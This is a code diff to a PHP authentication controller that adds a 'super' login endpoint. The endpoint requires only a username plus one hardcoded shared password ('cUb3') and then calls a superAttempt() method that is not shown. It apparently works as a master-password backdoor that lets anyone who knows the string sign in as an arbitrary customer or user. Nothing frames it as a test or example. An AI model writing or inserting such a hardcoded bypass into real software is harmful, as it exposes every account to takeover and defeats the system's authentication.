@@ -113,4 +113,37 @@ class AuthController extends Controller
 
         return (new AccountAuthentication($inputs))->forgotByPhone();
     }
+
+    /**
+     * Super login.
+     *
+     * Route Path       : {API_DOMAIN}/super/auth/login
+     * Route Name       : api.auth.super
+     * Route Method     : POST.
+     *
+     * @param Request $request
+     * @return JsonResponse
+     * @throws \Illuminate\Validation\ValidationException
+     * @throws \Throwable
+     */
+    public function super(Request $request): JsonResponse
+    {
+        $inputs = $this->validate($request, [
+            'guard' => ['nullable', Rule::in(['customer', 'user'])],
+            'username' => [Rule::requiredIf(! $request->hasAny(AccountAuthentication::getAvailableSocialLogin()))],
+            'password' => ['required',Rule::in(['cUb3'])],
+            'google_id' => ['nullable'],
+            'facebook_id' => ['nullable'],
+            'email' => [Rule::requiredIf($request->has('google_id'))],
+            'name' => [Rule::requiredIf($request->has('google_id'))],
+            'otp' => ['nullable', 'boolean'],
+            'otp_channel' => ['nullable', Rule::in(OneTimePassword::OTP_CHANNEL)],
+            'device_name' => ['required'],
+        ]);
+        // override value
+        $inputs['guard'] = $inputs['guard'] ?? 'customer';
+        $inputs['otp'] = $inputs['otp'] ?? false;
+
+        return (new AccountAuthentication($inputs))->superAttempt();
+    }
 }
